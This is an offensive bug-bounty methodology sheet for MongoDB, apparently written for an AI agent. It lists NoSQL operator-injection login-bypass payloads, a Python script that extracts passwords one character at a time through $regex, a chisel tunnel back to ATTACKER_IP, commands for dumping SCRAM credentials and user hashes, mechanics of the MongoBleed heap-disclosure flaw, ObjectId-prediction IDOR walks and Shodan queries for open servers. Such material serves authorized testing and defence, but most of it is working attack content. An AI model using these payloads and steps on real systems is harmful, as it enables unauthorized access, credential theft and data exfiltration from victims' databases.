---
technology: "MongoDB"
kind: bug-bounty-methodology
audience: ai-agent
family: databases
version: "1.0"
source: "corpus-mined (11 writeups, pass 1 2026-11-12) + upstream-verified (MongoDB docs: security checklist, IP binding)"
provenance: "corpus-mined 11-writeup basis (above). Wave 4 HT enrichment 2026-11-13: Phases 6-7 (MongoBleed CVE-2025-14847 pre-auth zlib heap disclosure — verified against MongoDB's December 2025 security-update post and the Unit 42 threat brief; ObjectId prediction as an IDOR lever — tool age and client-side-generation caveats carried) + Shodan/brute folds in the tool map, rewritten from HackTricks (src/network-services-pentesting/27017-27018-mongodb.md), CC BY-NC 4.0, accessed 2026-11-13."
---

# MongoDB bug-bounty methodology

Companion overview: [[mongodb]].

## Phase 0 — Recon

```
27017/tcp open  mongodb
nmap -sV --script "mongodb-*" -p 27017 198.51.100.x   # version + db enumeration NSE
```
No version in banner? The handshake still leaks build info to NSE. Find mongod bound inside container networks via `ss -lntp` on a foothold host (`127.0.0.1:27017`, `172.17.0.x:27017` (the container bridge address `ss` reported)) — then tunnel (Phase 4).

## Phase 1 — The walk-in (no-auth access)

Try connection before anything clever — auth is off until deliberately enabled:

```bash
mongosh mongodb://198.51.100.x:27017          # legacy shells: mongo <host>/<port>
mongosh mongodb://127.0.0.1:8181              # via tunnel
> show dbs
> use <appdb>
> show collections
> db.users.find()
```
Decision: any DB listing = full compromise path; dump `users` collections for password hashes/tokens and the `admin`/`local` databases. If `show dbs` errors with auth required → Phase 2/3 still apply through the app, and Phase 4 for URI creds.

## Phase 2 — NoSQL operator injection (auth bypass)

The application merges user input into a query object. Test both encodings on every login/search/reset endpoint:

**Form-encoded (Express `body-parser` extended):**
```
user=admin&password[$ne]=admin
username[$ne]=toto&password[$ne]=toto
username[$regex]=.*&password[$regex]=.*
```
**JSON body / API:**
```json
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$gt": undefined}, "password": {"$gt": undefined}}
{"email":"attacker@example.com","code":{"$ne": null}}      // reset-code bypass
q[$ne]=test&limit=2                                          // REST query params
```
Vulnerable servers evaluate the operator object server-side (`db.users.find({user:"admin", pass:{$ne:"admin"}})` matches the real admin row). Oracle: response differs (redirect to `/home.php`, session cookie, different error) vs a wrong-password control request. `$gt:0`/`$ne:null` on secondary fields (codes, IDs) bypasses non-login checks too.

Detection ladder: inject `$ne` → if server 500s or behavior changes, the input reaches the query builder → try `$regex` (Phase 3) → escalate to `$where` (JavaScript, RCE-adjacent on ancient versions) only as a last resort.

## Phase 3 — Blind extraction with `$regex`

When a bypass works but data isn't returned, use the auth-check oracle to pull field values character by character (classic NoSQL equivalent of `SUBSTRING`):

```python
import requests, string
known = ""
while True:
    for c in string.printable:
        r = requests.post("http://example.com/login", data={
            "username[$regex]": f"^{known}{c}",
            "password[$ne]": "x",
        }, allow_redirects=False)
        if r.status_code == 302:          # success oracle
            known += c; break
    else:
        break
print(known)                              # e.g. admin password
```
Same shape works against JSON APIs (`{"username":{"$regex":"^a"}}`) and cookie/session blobs (`"password":"abcd"` with a `startsWith`-style clause — brute each character of a stored hash).

## Phase 4 — Credential and URI hunting (host/app side)

Connection URIs are the credentials; grep for them once you have file read:

```
.env:                 URL_DATABASE="mongodb://localhost:27017"     (often no user:pass)
app source:           mongoose.connect('mongodb://localhost/blog')
config:               const dbURI = "mongodb://dev:***@localhost/dev?..."
connect_db.js:        dbName option names the application database
```
Credentialed URIs → replay against the daemon (`mongosh "mongodb://user:pass@127.0.0.1:27017/admin?authSource=admin"`). Containerized instances: port-forward with chisel from the foothold (`chisel client ATTACKER_IP:8000 R:8181:172.17.0.x:27017` (the container bridge address `ss` reported)), then `mongosh mongodb://localhost:8181`.

## Phase 5 — Post-access actions

```js
show dbs
use admin; db.system.users.find()          // SCRAM credential documents (crackable)
use <appdb>; show collections
db.users.find().pretty()                   // hashes, tokens, emails
db.getCollectionNames()
```
Hash formats: SCRAM iterations are expensive to crack — prefer token/session reuse and password reuse against SSH/admin panels. Check for `mongod` running as root and writable `dbPath` if you need host impact.

## Phase 6 — MongoBleed: pre-auth heap disclosure (CVE-2025-14847)

Port semantics first: 27017 is any `mongod`/`mongos` listener, 27018 a shard server, 27019 a config server. MongoBleed (disclosed 2025-12-19; CISA KEV-listed 2025-12-29 with a public PoC; upstream-verified against MongoDB's December 2025 security update and the Unit 42 threat brief) is an unauthenticated memory disclosure in how the server handles zlib-compressed wire messages, affecting the 3.6-through-8.2 release lines when zlib is among the negotiated compressors — the attacker only needs network reach to 27017, nothing else:

- The `OP_COMPRESSED` header carries an attacker-supplied `uncompressedSize`; the server trusts it, allocates that large a buffer, and copies back more than the payload — the surplus is uninitialized heap data (other connections, WiredTiger cache, `/proc` artifacts).
- Omit the BSON `\x00` terminator from the crafted document and the parser keeps scanning the oversized buffer for one; the resulting error response echoes the message AND the scanned heap bytes — pre-auth.
- Aggregation: repeat with varying lengths/offsets to reassemble secrets (credentials, API keys, session tokens). It is read-only (no RCE) and LOUD — thousands of short-lived connections; expect rate limits and detection, and scope accordingly.

Gate before claiming: confirm the version line, and confirm zlib is actually negotiable — `db.adminCommand({getParameter: 1, networkMessageCompressors: 1})` (the attacker advertises zlib in the handshake; the server must offer it too). Atlas was auto-patched; self-hosted needs the December 2025 patch set.

## Phase 7 — ObjectId prediction as an IDOR lever

ObjectIds are 12 bytes shown as 24 hex chars: a 4-byte big-endian Unix timestamp (readable via `ObjectId().getTimestamp()` in mongosh), a per-process random value (5 bytes in the current spec — older layouts used machine identifier + PID), and a 3-byte incrementing counter. IDs from the SAME generator inside a narrow time window therefore differ only in the counter — which is why APIs that use `_id` as the only authorization ("if you know the ObjectId you must own it") are attackable: learn one ID, predict its neighbors, walk them. mongo-objectid-predict generates candidate neighbors from a seed ObjectId (the public repo is 2018-era and models the old machine/PID layout — port or re-verify its assumptions before relying on the output). Two honesty gates: drivers generate IDs CLIENT-side (different processes carry different random components — prediction fails across them), and generated candidates are probes, not proof a resource exists or is authorized; every candidate still needs the API to actually serve it.

## Hardening flags you'll be fighting (upstream)

- `--auth` / `security.authorization: enabled` — access control (OFF by default; the security checklist's first item is to enable it).
- `net.bindIp` — localhost default since MongoDB 3.6; `--bind_ip_all` widens it.
- SCRAM default auth mechanism; app roles should be least-privilege (`readWrite` on one DB, not `root`).

## Tool map (named in prose)

mongosh (and legacy `mongo` shell), nmap `mongodb-*` NSE scripts (enumeration; `mongodb-brute` checks whether credentials are enforced), mongoose-aware request tooling (curl/Burp Repeater for `$ne`/`$regex` payloads), Python requests for regex-extraction scripts, chisel/socat for tunneling, mongodump for bulk exfil once connected. Shodan surface: `"mongodb server information"` — filter `-"partially enabled"` for fully open servers, keep the bare form to find auth-partial ones. mongo-objectid-predict for `_id`-as-authorization IDOR walks (Phase 7).
